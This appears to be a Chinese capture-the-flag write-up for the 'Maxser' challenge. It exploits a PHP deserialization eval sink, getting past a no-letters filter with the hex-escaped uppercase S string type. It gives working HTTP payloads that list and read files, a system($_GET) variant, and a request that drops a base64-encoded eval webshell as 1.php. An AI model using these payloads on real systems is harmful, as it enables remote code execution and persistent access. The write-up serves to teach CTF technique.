

[SWPU 2024 新生引导]Maxser

https://www.nssctf.cn/problem/5823







```php
highlight_file(__FILE__);
error_reporting(0);
include('check.php');//这里面是一个检测passthru->S属性的正则，大概意思就是这个属性不能含有字母，只能是数字或者符号之类的，那我们该如何拿到fLag呢?
class passthru{
    public $S;
    public $dir;
    public function __destruct(){
        
        eval($this->S);
    }
}
$a=$_GET['NSS'];
check($a);
unserialize($a)
```

> 脚本结束时触发 `__destruct()`



整体代码看来，没有复杂的 PHP 序列化的一环套一环

最主要的是，如何通过无字母进行该控制点的利用

为此，想到在 PHP **序列化类型标记** `S`

> 在 `unserialize()` 解析序列化数据时，大写 `S` 是一种特殊字符串类型表示
>
> 它使用 `\hh` 表示一个十六进制字节，其中 `hh` 必须是两个十六进制字符

但其实，一般来说，`\x数字` 表示十六进制，`\数字` 表示八进制

字符串转十六进制：

```python
# 原始字符串
payload = "passthru('dir /');"

# 转换为 \70\61... 格式
escaped = ''.join(f'\\{byte:02x}' for byte in payload.encode())

print(escaped)
```

- `system` -> `\73\79\73\74\65\6d`
- `passthru` -> `\70\61\73\73\74\68\72\75`
- `dir` -> `\64\69\72`
- `ls` -> `\6c\73`
- `cat` -> `\63\61\74`



由于，system、ls 的十六进制转义存在字母，故会被 forbidden

所以，这里通过 passthru、dir 进行扫描，然后用 cat 进行读取

首先，通过 PHP Exp 生成原始 payload

```php
<?php
class passthru{
    public $S;
    public $dir;
}

$a = new passthru();
$a->S = "passthru('dir /');";

echo serialize($a);
```

然后，通过字符串转十六进制脚本，对序列化后 S 的值进行修改

这个时候，不用改数字，只需要替换字符串为十六进制即可

同时，把 `s:18`，更改成 `S:18`

```php
GET /?NSS=O:8:"passthru":2:{s:1:"S";S:18:"\70\61\73\73\74\68\72\75\28\27\64\69\72\20/\27\29;";s:3:"dir";N;} HTTP/1.1
```

得到根目录下的 `f1ag`：![image-20261117164839893](%5BSWPU%202024%20%E6%96%B0%E7%94%9F%E5%BC%95%E5%AF%BC%5DMaxser/image-20261117164839893.png)

`cat /f1ag`，拿到flag：

```http
GET /?NSS=O:8:"passthru":2:{s:1:"S";S:22:"\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66\31\61\67\27\29;";s:3:"dir";N;} HTTP/1.1
```

![image-20261117170031951](%5BSWPU%202024%20%E6%96%B0%E7%94%9F%E5%BC%95%E5%AF%BC%5DMaxser/image-20261117170031951.png)



































```
$a = new passthru();
$a->S = "phpinfo();";

echo urlencode(serialize($a));
```

![image-20261117085257354](%5BSWPU%202024%20%E6%96%B0%E7%94%9F%E5%BC%95%E5%AF%BC%5DMaxser/image-20261117085257354.png)



```
$a = new passthru();
$a->S = "system('$_GET[0]');";

echo urlencode(serialize($a));
```



![image-20261117085354754](%5BSWPU%202024%20%E6%96%B0%E7%94%9F%E5%BC%95%E5%AF%BC%5DMaxser/image-20261117085354754.png)





看了大佬的

上传一句话木马

```http
POST /?NSS=O:8:"passthru":2:{s:1:"S";s:77:"system("echo+PD9waHAKCiAgICBAZXZhbCgkX1BPU1RbJ3FxJ10pOwo=|base64+-d+>1.php");";s:3:"dir";N;} HTTP/1.1
```

> `s:3:"dir";N;`
>
> - `N` 数据类型为 NULL
>
> - `;` 结束标记

随后，即可蚁剑访问得到 flag

![image-20261117090534045](%5BSWPU%202024%20%E6%96%B0%E7%94%9F%E5%BC%95%E5%AF%BC%5DMaxser/image-20261117090534045.png)





关于 check.php 的讲解

```php
<?php
function check($a){
    if (!isset($a)){
        echo '<br>来吧，湮灭极限!';
    }
    elseif (strpos($a, 'S:') !== false and substr($a,26,1)=='S'){
        $s='/S\:(.*?)\;s/';
    }else {
        echo '你这样貌似是做不出来的哦，再想想吧';
    }
preg_match($s,$a,$b);
if(preg_match('/[A-Za-z_\(\)]+/',$b[1])){
            echo '<br>';   
            die('这样可是行不通的哦，进入了我的无字母正则');
        }else{
             echo '<br>'; 
             return $a;
        }
}
```









